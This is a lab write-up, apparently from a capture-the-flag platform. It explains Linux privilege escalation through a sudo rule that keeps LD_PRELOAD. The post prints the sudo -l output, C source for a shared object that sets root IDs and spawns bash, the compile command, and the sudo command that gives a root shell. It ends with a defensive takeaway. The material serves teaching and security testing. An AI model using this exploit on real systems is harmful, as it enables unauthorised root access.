---
layout: post
title: "Linux privilege escalation via LD_PRELOAD"
date: 2026-06-01 00:00:00 +0100
categories: [thm, hacking]
tags: [labs, privilege escalation, linux, LD_PRELOAD]
---

![priv_esc_ld_preload](pics/ld_preload.png)

### Privilege escalation typical check

Basically there are countless ways to escalate privileges, but here's a simple example of becoming *root* on a Linux system.
The first things I check after gaining access to a box is what actions my current user is allowed to perform:

*sudo -l* - is a top easy command to check:

```bash
frank $ sudo -l
Matching Defaults entries for frank on challenge:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty, env_keep+=LD_PRELOAD

User frank may run the following commands on challenge:
    (root) NOPASSWD: /usr/bin/id

```

Ok, we could run `sudo id` without root password sounds not like *WOW!* - by itself `id` do nothing special in terms of priviledge escalation, but together with a `LD_PRELOAD` it is our golden ticket to became a *ROOT*

### Exploiting LD_PRELOAD and our *id* binary

Create the following C file:

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    // to prevent recursion
    unsetenv("LD_PRELOAD");

    setuid(0);
    setgid(0);

    system("/bin/bash");
}
```

Compile as a shared object:

```bash
frank $ gcc -fPIC -shared -o /tmp/pre_kill.so /tmp/pre_kill.c -nostartfiles
```

Spawn a shell by executing the allowed command:

```bash
frank $ sudo LD_PRELOAD=/tmp/pre_kill.so /usr/bin/id
root $
```

### Lesson takeaway
When reviewing `sudo -l` output, don't focus only on the allowed binaries.
Check reserved environment variables such as `LD_PRELOAD`, `LD_LIBRARY_PATH`, or other misconfigurations that can completely change the attack surface!